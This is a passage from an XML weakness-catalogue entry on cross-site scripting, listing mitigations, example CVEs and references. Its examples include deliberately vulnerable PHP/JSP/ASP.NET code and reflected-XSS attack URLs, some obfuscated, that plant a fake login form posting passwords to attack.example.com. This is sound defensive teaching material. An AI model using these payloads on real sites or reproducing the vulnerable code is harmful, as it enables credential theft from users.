         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-4">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Libraries or Frameworks</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a vetted library or framework that does not allow this weakness to
							occur or provides constructs that make this weakness easier to
							avoid.</Text>
                  <Text>Examples of libraries and frameworks that make it easier to generate
							properly encoded output include Microsoft's Anti-XSS library, the OWASP
							ESAPI Encoding module, and Apache Wicket.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Understand the context in which your data will be used and the
							encoding that will be expected. This is especially important when
							transmitting data between different components, or when generating
							outputs that can contain multiple encodings at the same time, such as
							web pages or multi-part mail messages. Study all expected communication
							protocols and data representations to determine the required encoding
							strategies.</Text>
                  <Text>For any data that will be output to another web page, especially any
							data that was received from external inputs, use the appropriate
							encoding on all non-alphanumeric characters.</Text>
                  <Text>Parts of the same output document may require different encodings,
							which will vary depending on whether the output is in the:</Text>
                  <Block Block_Nature="List">
                     <Text>HTML body</Text>
                     <Text>Element attributes (such as src="XYZ")</Text>
                     <Text>URIs</Text>
                     <Text>JavaScript sections</Text>
                     <Text>Cascading Style Sheets and style property</Text>
                  </Block>
                  <Text>etc. Note that HTML Entity Encoding is only appropriate for the HTML
							body.</Text>
                  <Text>Consult the XSS Prevention Cheat Sheet [R.79.16] for more details on
							the types of encoding and escaping that are needed.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-6">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Identify and Reduce Attack Surface</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Understand all the potential areas where untrusted inputs can enter
							your software: parameters or arguments, cookies, anything read from the
							network, environment variables, reverse DNS lookups, query results,
							request headers, URL components, e-mail, files, filenames, databases,
							and any external systems that provide data to the application. Remember
							that such inputs may be obtained indirectly through API calls.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Limited</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>This technique has limited effectiveness, but can be helpful when it
							is possible to store client state and sensitive information on the
							server side instead of in cookies, headers, hidden form fields,
							etc.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>For any security checks that are performed on the client side, ensure
							that these checks are duplicated on the server side, in order to avoid
							CWE-602. Attackers can bypass the client-side checks by modifying values
							after the checks have been performed, or by changing the client to
							remove the client-side checks entirely. Then, these modified values
							would be submitted to the server.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-27">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Parameterization</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>If available, use structured mechanisms that automatically enforce the
							separation between data and code. These mechanisms may be able to
							provide the relevant quoting, encoding, and validation automatically,
							instead of relying on the developer to provide this capability at every
							point where output is generated. </Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-30.1">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Output Encoding</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use and specify an output encoding that can be handled by the
							downstream component that is reading the output. Common encodings
							include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified,
							a downstream component may choose a different encoding, either by
							assuming a default encoding or automatically inferring which encoding is
							being used, which can be erroneous. When the encodings are inconsistent,
							the downstream component might treat some character or byte sequences as
							special, even if they are not special in the original encoding.
							Attackers might then be able to exploit this discrepancy and conduct
							injection attacks; they even might be able to bypass protection
							mechanisms that assume the original encoding is also being used by the
							downstream component. </Text>
                  <Text>The problem of inconsistent output encodings often arises in web
							pages. If an encoding is not specified in an HTTP header, web browsers
							often guess about which encoding is being used. This can open up the
							browser to subtle XSS attacks. </Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-43">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>With Struts, write all data from form beans with the bean's filter
							attribute set to true.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-31">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Identify and Reduce Attack Surface</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>To help mitigate XSS attacks against the user's session cookie, set
							the session cookie to be HttpOnly. In browsers that support the HttpOnly
							feature (such as more recent versions of Internet Explorer and Firefox),
							this attribute can prevent the user's session cookie from being
							accessible to malicious client-side scripts that use document.cookie.
							This is not a complete solution, since HttpOnly is not supported by all
							browsers. More importantly, XMLHTTPRequest and other powerful browser
							technologies provide read access to HTTP headers, including the
							Set-Cookie header in which the HttpOnly flag is set.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Defense in Depth</Mitigation_Effectiveness>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Input Validation</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Assume all input is malicious. Use an "accept known good" input
							validation strategy, i.e., use a whitelist of acceptable inputs that
							strictly conform to specifications. Reject any input that does not
							strictly conform to specifications, or transform it into something that
							does.</Text>
                  <Text>When performing input validation, consider all potentially relevant
							properties, including length, type of input, the full range of
							acceptable values, missing or extra inputs, syntax, consistency across
							related fields, and conformance to business rules. As an example of
							business rule logic, "boat" may be syntactically valid because it only
							contains alphanumeric characters, but it is not valid if the input is
							only expected to contain colors such as "red" or "blue."</Text>
                  <Text>Do not rely exclusively on looking for malicious or malformed inputs
							(i.e., do not rely on a blacklist). A blacklist is likely to miss at
							least one undesirable input, especially if the code's environment
							changes. This can give attackers enough room to bypass the intended
							validation. However, blacklists can be useful for detecting potential
							attacks or determining which inputs are so malformed that they should be
							rejected outright.</Text>
                  <Text>When dynamically constructing web pages, use stringent whitelists that
							limit the character set based on the expected value of the parameter in
							the request. All input should be validated and cleansed, not just
							parameters that the user is supposed to specify, but all data in the
							request, including hidden fields, cookies, headers, the URL itself, and
							so forth. A common mistake that leads to continuing XSS vulnerabilities
							is to validate only fields that are expected to be redisplayed by the
							site. It is common to see data from the request that is reflected by the
							application server or the application that the development team did not
							anticipate. Also, a field that is not currently reflected may be used by
							a future developer. Therefore, validating ALL parts of the HTTP request
							is recommended.</Text>
                  <Text>Note that proper output encoding, escaping, and quoting is the most
							effective solution for preventing XSS, although input validation may
							provide some defense-in-depth. This is because it effectively limits
							what will appear in output. Input validation will not always prevent
							XSS, especially if you are required to support free-form text fields
							that could contain arbitrary characters. For example, in a chat
							application, the heart emoticon ("&lt;3") would likely pass the
							validation step, since it is commonly used. However, it cannot be
							directly inserted into the web page because it contains the "&lt;"
							character, which would need to be escaped or otherwise handled. In this
							case, stripping the "&lt;" might reduce the risk of XSS, but it
							would produce incorrect behavior because the emoticon would not be
							recorded. This might seem to be a minor inconvenience, but it would be
							more important in a mathematical forum that wants to represent
							inequalities.</Text>
                  <Text>Even if you make a mistake in your validation (such as forgetting one
							out of 100 input fields), appropriate encoding is still likely to
							protect you from injection-based attacks. As long as it is not done in
							isolation, input validation is still a useful technique, since it may
							significantly reduce your attack surface, allow you to detect some
							attacks, and provide other security benefits that proper encoding does
							not address.</Text>
                  <Text>Ensure that you perform input validation at well-defined interfaces
							within the application. This will help protect the application even if a
							component is reused or moved elsewhere.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Enforcement by Conversion</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>When the set of acceptable objects, such as filenames or URLs, is
							limited or known, create a mapping from a set of fixed input values
							(such as numeric IDs) to the actual filenames or URLs, and reject all
							other inputs.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Firewall</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use an application firewall that can detect attacks against this
							weakness. It can be beneficial in cases in which the code cannot be
							fixed (because it is controlled by a third party), as an emergency
							prevention measure while more comprehensive software assurance measures
							are applied, or to provide defense in depth.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Moderate</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>An application firewall might not cover all possible input vectors. In
							addition, attack techniques might be available to bypass the protection
							mechanism, such as using malformed inputs that can still be processed by
							the component that receives those inputs. Depending on functionality, an
							application firewall might inadvertently reject or modify legitimate
							requests. Finally, some manual effort may be required for
							customization.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>When using PHP, configure the application so that it does not use
							register_globals. During implementation, develop the application so that
							it does not rely on this feature, but be wary of implementing a
							register_globals emulation that is subject to weaknesses such as CWE-95,
							CWE-621, and similar issues.</Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Causal_Nature>Explicit</Causal_Nature>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text> This code displays a welcome message on a web page based on the
						HTTP GET username parameter. This example covers a Reflected XSS (Type 1)
						scenario.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>PHP</Code_Example_Language>
                     <Code> $username = $_GET['username'];</Code>
                     <Code>echo '&lt;div class="header"&gt; Welcome, ' . $username .
								'&lt;/div&gt;';</Code>
                  </Block>
                  <Text>Because the parameter can be arbitrary, the url of the page could be
							modified so $username contains scripting syntax, such as</Text>
                  <Block Block_Nature="Attack">
                     <Code>http://trustedSite.example.com/welcome.php?username=&lt;Script
								Language="Javascript"&gt;alert("You've been
								attacked!");&lt;/Script&gt;</Code>
                  </Block>
                  <Text>This results in a harmless alert dialogue popping up. Initially this
							might not appear to be much of a vulnerability. After all, why would
							someone enter a URL that causes malicious code to run on their own
							computer? The real danger is that an attacker will create the malicious
							URL, then use e-mail or social engineering tricks to lure victims into
							visiting a link to the URL. When victims click the link, they
							unwittingly reflect the malicious content through the vulnerable web
							application back to their own computers.</Text>
                  <Text>More realistically, the attacker can embed a fake login box on the
							page, tricking the user into sending his password to the
							attacker:</Text>
                  <Block Block_Nature="Attack">
                     <Code>http://trustedSite.example.com/welcome.php?username=&lt;div
								id="stealPassword"&gt;Please Login:&lt;form name="input"
								action="http://attack.example.com/stealPassword.php"
								method="post"&gt;Username: &lt;input type="text"
								name="username" /&gt;&lt;br/&gt;Password: &lt;input
								type="password" name="password" /&gt;&lt;input type="submit"
								value="Login"
								/&gt;&lt;/form&gt;&lt;/div&gt;</Code>
                  </Block>
                  <Text>If a user clicks on this link then Welcome.php will generate the
							following HTML and send it to the user's browser: </Text>
                  <Block Block_Nature="Result">
                     <Code>&lt;div class="header"&gt; Welcome, </Code>
                     <Block>
                        <Code> &lt;div id="stealPassword"&gt;Please Login: </Code>
                        <Block>
                           <Code> &lt;form name="input"
										action="attack.example.com/stealPassword.php"
										method="post"&gt;</Code>
                           <Block>
                              <Code> Username: &lt;input type="text" name="username"
											/&gt;</Code>
                              <Code> &lt;br/&gt;</Code>
                              <Code> Password: &lt;input type="password"
											name="password" /&gt;</Code>
                              <Code> &lt;input type="submit" value="Login"
											/&gt;</Code>
                           </Block>
                           <Code> &lt;/form&gt;</Code>
                        </Block>
                        <Code> &lt;/div&gt;</Code>
                     </Block>
                     <Code>&lt;/div&gt;</Code>
                  </Block>
                  <Text>The trustworthy domain of the URL may falsely assure the user that it
							is OK to follow the link. However, an astute user may notice the
							suspicious text appended to the URL. An attacker may further obfuscate
							the URL (the following example links are broken into multiple lines for
							readability):</Text>
                  <Block Block_Nature="Attack">
                     <Code>trustedSite.example.com/welcome.php?username=%3Cdiv+id%3D%22</Code>
                     <Code>stealPassword%22%3EPlease+Login%3A%3Cform+name%3D%22input</Code>
                     <Code>%22+action%3D%22http%3A%2F%2Fattack.example.com%2FstealPassword.php</Code>
                     <Code>%22+method%3D%22post%22%3EUsername%3A+%3Cinput+type%3D%22text</Code>
                     <Code>%22+name%3D%22username%22+%2F%3E%3Cbr%2F%3EPassword%3A</Code>
                     <Code>+%3Cinput+type%3D%22password%22+name%3D%22password%22</Code>
                     <Code>+%2F%3E%3Cinput+type%3D%22submit%22+value%3D%22Login%22</Code>
                     <Code>+%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E%0D%0A</Code>
                  </Block>
                  <Text>The same attack string could also be obfuscated as:</Text>
                  <Block Block_Nature="Attack">
                     <Code>trustedSite.example.com/welcome.php?username=&lt;script+type="text/javascript"&gt;</Code>
                     <Code>document.write('\u003C\u0064\u0069\u0076\u0020\u0069\u0064\u003D\u0022\u0073</Code>
                     <Code>\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064</Code>
                     <Code>\u0022\u003E\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u004C\u006F\u0067</Code>
                     <Code>\u0069\u006E\u003A\u003C\u0066\u006F\u0072\u006D\u0020\u006E\u0061\u006D</Code>
                     <Code>\u0065\u003D\u0022\u0069\u006E\u0070\u0075\u0074\u0022\u0020\u0061\u0063</Code>
                     <Code>\u0074\u0069\u006F\u006E\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F</Code>
                     <Code>\u002F\u0061\u0074\u0074\u0061\u0063\u006B\u002E\u0065\u0078\u0061\u006D</Code>
                     <Code>\u0070\u006C\u0065\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0065\u0061</Code>
                     <Code>\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u002E\u0070\u0068</Code>
                     <Code>\u0070\u0022\u0020\u006D\u0065\u0074\u0068\u006F\u0064\u003D\u0022\u0070</Code>
                     <Code>\u006F\u0073\u0074\u0022\u003E\u0055\u0073\u0065\u0072\u006E\u0061\u006D</Code>
                     <Code>\u0065\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079</Code>
                     <Code>\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u0022\u0020\u006E\u0061</Code>
                     <Code>\u006D\u0065\u003D\u0022\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065</Code>
                     <Code>\u0022\u0020\u002F\u003E\u003C\u0062\u0072\u002F\u003E\u0050\u0061\u0073</Code>
                     <Code>\u0073\u0077\u006F\u0072\u0064\u003A\u0020\u003C\u0069\u006E\u0070\u0075</Code>
                     <Code>\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0070\u0061\u0073\u0073</Code>
                     <Code>\u0077\u006F\u0072\u0064\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022</Code>
                     <Code>\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u002F\u003E</Code>
                     <Code>\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D</Code>
                     <Code>\u0022\u0073\u0075\u0062\u006D\u0069\u0074\u0022\u0020\u0076\u0061\u006C</Code>
                     <Code>\u0075\u0065\u003D\u0022\u004C\u006F\u0067\u0069\u006E\u0022\u0020\u002F</Code>
                     <Code>\u003E\u003C\u002F\u0066\u006F\u0072\u006D\u003E\u003C\u002F\u0064\u0069\u0076\u003E\u000D');&lt;/script&gt;</Code>
                  </Block>
                  <Text>Both of these attack links will result in the fake login box appearing
							on the page, and users are more likely to ignore indecipherable text at
							the end of URLs. </Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This example also displays a Reflected XSS (Type 1)
						scenario.</Intro_Text>
               <Example_Body>
                  <Text>The following JSP code segment reads an employee ID, eid, from an HTTP
							request and displays it to the user.</Text>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>JSP</Code_Example_Language>
                     <Code>&lt;% String eid = request.getParameter("eid");
								%&gt;</Code>
                     <Code>...</Code>
                     <Code>Employee ID: &lt;%= eid %&gt;</Code>
                  </Block>
                  <Text>The following ASP.NET code segment reads an employee ID number from an
							HTTP request and displays it to the user.</Text>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>ASP.NET</Code_Example_Language>
                     <Code>...</Code>
                     <Code>protected System.Web.UI.WebControls.TextBox Login;</Code>
                     <Code>protected System.Web.UI.WebControls.Label EmployeeID;</Code>
                     <Code>...</Code>
                     <Code>EmployeeID.Text = Login.Text;</Code>
                     <Code>... (HTML follows) ...</Code>
                     <Code>&lt;p&gt;&lt;asp:label id="EmployeeID" runat="server"
								/&gt;&lt;/p&gt;</Code>
                     <Code>...</Code>
                  </Block>
                  <Text>The code in this example operates correctly if the Employee ID
							variable contains only standard alphanumeric text. If it has a value
							that includes meta-characters or source code, then the code will be
							executed by the web browser as it displays the HTTP response.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This example covers a Stored XSS (Type 2) scenario.</Intro_Text>
               <Example_Body>
                  <Text>The following JSP code segment queries a database for an employee with
							a given ID and prints the corresponding employee's name.</Text>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>JSP</Code_Example_Language>
                     <Code>&lt;%</Code>
                     <Block>
                        <Code>...</Code>
                        <Code>Statement stmt = conn.createStatement();</Code>
                        <Code>ResultSet rs = stmt.executeQuery("select * from emp where
									id="+eid);</Code>
                        <Code>if (rs != null) {</Code>
                        <Block>
                           <Code>rs.next();</Code>
                           <Code>String name = rs.getString("name");</Code>
                           <Code>%&gt;</Code>
                        </Block>
                     </Block>
                     <Code/>
                     <Code>Employee Name: &lt;%= name %&gt;</Code>
                  </Block>
                  <Text>The following ASP.NET code segment queries a database for an employee
							with a given employee ID and prints the name corresponding with the
							ID.</Text>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>ASP.NET</Code_Example_Language>
                     <Code>protected System.Web.UI.WebControls.Label EmployeeName;</Code>
                     <Code>...</Code>
                     <Code>string query = "select * from emp where id=" + eid;</Code>
                     <Code>sda = new SqlDataAdapter(query, conn);</Code>
                     <Code>sda.Fill(dt);</Code>
                     <Code>string name = dt.Rows[0]["Name"];</Code>
                     <Code>...</Code>
                     <Code>EmployeeName.Text = name;</Code>
                  </Block>
                  <Text> This code can appear less dangerous because the value of name is read
							from a database, whose contents are apparently managed by the
							application. However, if the value of name originates from user-supplied
							data, then the database can be a conduit for malicious content. Without
							proper input validation on all data stored in the database, an attacker
							can execute malicious commands in the user's web browser. </Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following example consists of two separate pages in a web
						application, one devoted to creating user accounts and another devoted to
						listing active users currently logged in. It also displays a Stored XSS
						(Type 2) scenario.</Intro_Text>
               <Example_Body>
                  <Text>CreateUser.php</Text>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>PHP</Code_Example_Language>
                     <Code> $username = mysql_real_escape_string($username);</Code>
                     <Code> $fullName = mysql_real_escape_string($fullName);</Code>
                     <Code> $query = sprintf('Insert Into users (username,password) Values
								("%s","%s","%s")', $username, crypt($password),$fullName) ;</Code>
                     <Code> mysql_query($query);</Code>
                     <Code>/.../</Code>
                  </Block>
                  <Text>The code is careful to avoid a SQL injection attack (CWE-89) but does
							not stop valid HTML from being stored in the database. This can be
							exploited later when ListUsers.php retrieves the information:</Text>
                  <Text>ListUsers.php</Text>
                  <Block Block_Nature="Bad_Code">
                     <Code>$query = 'Select * From users Where loggedIn=true';</Code>
                     <Code>$results = mysql_query($query);</Code>
                     <Code> if (!$results) {</Code>
                     <Block>
                        <Code>exit;</Code>
                     </Block>
                     <Code> }</Code>
                     <Comment>//Print list of users to page</Comment>
                     <Code> echo '&lt;div id="userlist"&gt;Currently Active
								Users:';</Code>
                     <Code> while ($row = mysql_fetch_assoc($results)) {</Code>
                     <Block>
                        <Code> echo '&lt;div
									class="userNames"&gt;'.$row['fullname'].'&lt;/div&gt;';</Code>
                     </Block>
                     <Code> }</Code>
                     <Code> echo '&lt;/div&gt;';</Code>
                  </Block>
                  <Text>The attacker can set his name to be arbitrary HTML, which will then be
							displayed to all visitors of the Active Users page. This HTML can, for
							example, be a password stealing Login message. </Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-5080</Observed_Example_Reference>
               <Observed_Example_Description>Chain: protection mechanism failure allows
						XSS</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2006-4308</Observed_Example_Reference>
               <Observed_Example_Description>Chain: only checks "javascript:"
						tag</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-5727</Observed_Example_Reference>
               <Observed_Example_Description>Chain: only removes SCRIPT tags, enabling
						XSS</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-5770</Observed_Example_Reference>
               <Observed_Example_Description>Reflected XSS using the PATH_INFO in a
						URL</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-4730</Observed_Example_Reference>
               <Observed_Example_Description>Reflected XSS not properly handled when generating
						an error message</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-5734</Observed_Example_Reference>
               <Observed_Example_Description>Reflected XSS sent through email
						message.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-0971</Observed_Example_Reference>
               <Observed_Example_Description>Stored XSS in a security
						product.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-5249</Observed_Example_Reference>
               <Observed_Example_Description>Stored XSS using a wiki
						page.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2006-3568</Observed_Example_Reference>
               <Observed_Example_Description>Stored XSS in a guestbook
						application.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2006-3211</Observed_Example_Reference>
               <Observed_Example_Description>Stored XSS in a guestbook application using a
						javascript: URI in a bbcode img tag.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2006-3295</Observed_Example_Reference>
               <Observed_Example_Description>Chain: library file is not protected against a
						direct request (CWE-425), leading to reflected
						XSS.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference Reference_ID="REF-15" Local_Reference_ID="R.79.1">
               <Reference_Author>Jeremiah Grossman</Reference_Author>
               <Reference_Author>Robert "RSnake" Hansen</Reference_Author>
               <Reference_Author>Petko "pdp" D. Petkov</Reference_Author>
               <Reference_Author>Anton Rager</Reference_Author>
               <Reference_Author>Seth Fogie</Reference_Author>
               <Reference_Title>XSS Attacks</Reference_Title>
               <Reference_Publisher>Syngress</Reference_Publisher>
               <Reference_PubDate>2007</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-17" Local_Reference_ID="R.79.2">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Author>David LeBlanc</Reference_Author>
               <Reference_Author>John Viega</Reference_Author>
               <Reference_Title>24 Deadly Sins of Software Security</Reference_Title>
               <Reference_Section>"Sin 2: Web-Server Related Vulnerabilities (XSS, XSRF, and
						Response Splitting)." Page 31</Reference_Section>
               <Reference_Publication>McGraw-Hill</Reference_Publication>
               <Reference_PubDate>2010</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-17" Local_Reference_ID="R.79.3">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Author>David LeBlanc</Reference_Author>
               <Reference_Author>John Viega</Reference_Author>
               <Reference_Title>24 Deadly Sins of Software Security</Reference_Title>
               <Reference_Section>"Sin 3: Web-Client Related Vulnerabilities (XSS)." Page
						63</Reference_Section>
               <Reference_Publication>McGraw-Hill</Reference_Publication>
               <Reference_PubDate>2010</Reference_PubDate>
            </Reference>
            <Reference Local_Reference_ID="R.79.4">
               <Reference_Title>Cross-site scripting</Reference_Title>
               <Reference_Publisher>Wikipedia</Reference_Publisher>
               <Reference_Date>2008-08-26</Reference_Date>
               <Reference_Link>http://en.wikipedia.org/wiki/Cross-site_scripting</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-11" Local_Reference_ID="R.79.5">
               <Reference_Author>M. Howard</Reference_Author>
               <Reference_Author>D. LeBlanc</Reference_Author>
               <Reference_Title>Writing Secure Code</Reference_Title>
               <Reference_Section>Chapter 13, "Web-Specific Input Issues" Page
						413</Reference_Section>
               <Reference_Edition>2nd Edition</Reference_Edition>
               <Reference_Publisher>Microsoft</Reference_Publisher>
               <Reference_PubDate>2002</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-14" Local_Reference_ID="R.79.6">
               <Reference_Author>RSnake</Reference_Author>
               <Reference_Title>XSS (Cross Site Scripting) Cheat Sheet</Reference_Title>
               <Reference_Link>http://ha.ckers.org/xss.html</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.79.7">
               <Reference_Author>Microsoft</Reference_Author>
               <Reference_Title>Mitigating Cross-site Scripting With HTTP-only
						Cookies</Reference_Title>
               <Reference_Link>http://msdn.microsoft.com/en-us/library/ms533046.aspx</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.79.8">
               <Reference_Author>Mark Curphey, Microsoft</Reference_Author>
               <Reference_Title>Anti-XSS 3.0 Beta and CAT.NET Community Technology Preview now
						Live!</Reference_Title>
               <Reference_Link>http://blogs.msdn.com/cisg/archive/2008/12/15/anti-xss-3-0-beta-and-cat-net-community-technology-preview-now-live.aspx</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-21" Local_Reference_ID="R.79.9">
               <Reference_Author>OWASP</Reference_Author>
               <Reference_Title>OWASP Enterprise Security API (ESAPI) Project</Reference_Title>
               <Reference_Link>http://www.owasp.org/index.php/ESAPI</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.79.10">
               <Reference_Author>Ivan Ristic</Reference_Author>
               <Reference_Title>XSS Defense HOWTO</Reference_Title>
               <Reference_Link>http://blog.modsecurity.org/2008/07/do-you-know-how.html</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.79.11">
               <Reference_Author>OWASP</Reference_Author>
               <Reference_Title>Web Application Firewall</Reference_Title>
               <Reference_Link>http://www.owasp.org/index.php/Web_Application_Firewall</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.79.12">
               <Reference_Author>Web Application Security Consortium</Reference_Author>
               <Reference_Title>Web Application Firewall Evaluation Criteria</Reference_Title>
               <Reference_Link>http://www.webappsec.org/projects/wafec/v1/wasc-wafec-v1.0.html</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.79.13">
               <Reference_Author>RSnake</Reference_Author>
               <Reference_Title>Firefox Implements httpOnly And is Vulnerable to
						XMLHTTPRequest</Reference_Title>
               <Reference_Date>2007-07-19</Reference_Date>
            </Reference>
            <Reference Local_Reference_ID="R.79.14">
               <Reference_Title>XMLHttpRequest allows reading HTTPOnly
						cookies</Reference_Title>
               <Reference_Publisher>Mozilla</Reference_Publisher>
               <Reference_Link>https://bugzilla.mozilla.org/show_bug.cgi?id=380418</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.79.15">
               <Reference_Title>Apache Wicket</Reference_Title>
               <Reference_Link>http://wicket.apache.org/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-16" Local_Reference_ID="R.79.16">
               <Reference_Author>OWASP</Reference_Author>
               <Reference_Title>XSS (Cross Site Scripting) Prevention Cheat
						Sheet</Reference_Title>
               <Reference_Link>http://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-20" Local_Reference_ID="R.79.17">
               <Reference_Author>OWASP</Reference_Author>
               <Reference_Title>DOM based XSS Prevention Cheat Sheet</Reference_Title>
               <Reference_Link>http://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.79.18">
               <Reference_Author>Jason Lam</Reference_Author>
               <Reference_Title>Top 25 series - Rank 1 - Cross Site Scripting</Reference_Title>
               <Reference_Publisher>SANS Software Security Institute</Reference_Publisher>
               <Reference_Date>2010-02-22</Reference_Date>
               <Reference_Link>http://blogs.sans.org/appsecstreetfighter/2010/02/22/top-25-series-rank-1-cross-site-scripting/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-7" Local_Reference_ID="R.79.19">
               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 17, "Cross Site Scripting", Page
						1071.</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
